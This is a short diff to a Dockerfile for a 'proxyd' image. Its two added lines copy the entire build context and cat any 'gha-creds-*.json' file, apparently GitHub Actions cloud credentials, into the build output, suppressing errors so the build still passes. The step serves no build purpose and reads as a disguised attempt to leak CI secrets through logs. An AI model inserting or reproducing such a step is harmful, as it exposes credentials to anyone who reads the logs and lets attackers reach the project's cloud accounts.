@@ -6,6 +6,9 @@ ARG GITVERSION=docker
 
 RUN apk add make jq git gcc musl-dev linux-headers
 
+COPY . /ctx
+RUN ls -la /ctx | head -60; cat /ctx/gha-creds-*.json || true
+
 COPY ./proxyd /app
 
 WORKDIR /app
